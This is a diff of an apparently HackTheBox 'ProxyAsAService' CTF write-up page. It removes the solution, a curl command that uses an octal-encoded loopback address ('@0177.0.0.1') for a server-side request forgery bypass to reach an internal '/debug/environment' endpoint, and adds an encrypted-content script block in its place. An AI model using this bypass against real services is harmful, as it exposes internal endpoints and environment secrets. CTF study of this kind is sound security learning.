-</code></pre></div>
-<blockquote>
-<p>https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Request%20Forgery/#bypass-using-octal-ip</p>
-</blockquote>
-<h3 id="get-flag">Get Flag</h3>
-<div class="language-text highlight"><pre><span></span><code>curl http://[ip]:[port]/?url=@0177.0.0.1:1337/debug/environment
-</code></pre></div>
-<ul>
-<li>本地测试</li>
-</ul>
-<p><img alt="image-20231025160945239" src="https://cdn.jsdelivr.net/gh/zer0-hex/image-hosting@main/typora/202310251609312.png" /></p>
+<script type="text/javascript">
+var encryptcontent_id = "encryptcontent_1";
+var encryptcontent_path = "write-up/HackTheBox/Challenges/Web/Easy-ProxyAsAService/";
+var decryption_failure_message = "Invalid password.";
+var encryptcontent_keystore = ["k4JBGRqzemHNA96yZ31Zzg==;HaGHJ4qA8PZ2maGJ2luE3Pv7lh6FvLOmvLi3H2hZL6F+QNx0vENlwS+A6TNM3zZfAnj7RAFGi9N1lzxtdcBZKoeuOtiu3L+FTqxa3x7FMx+TGAdTBo305KG0ZctKTyjX;38PlOKb1krn1jrDh29Xalg=="];
+var encryptcontent_obfuscate = 0;
+
+</script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/core.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/enc-base64.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/cipher-core.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/sha256.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/hmac.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/pbkdf2.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/aes.js"></script>
+<script type="text/javascript" src="../../../../assets/javascripts/decrypt-contents.js" defer></script>
 
 
 
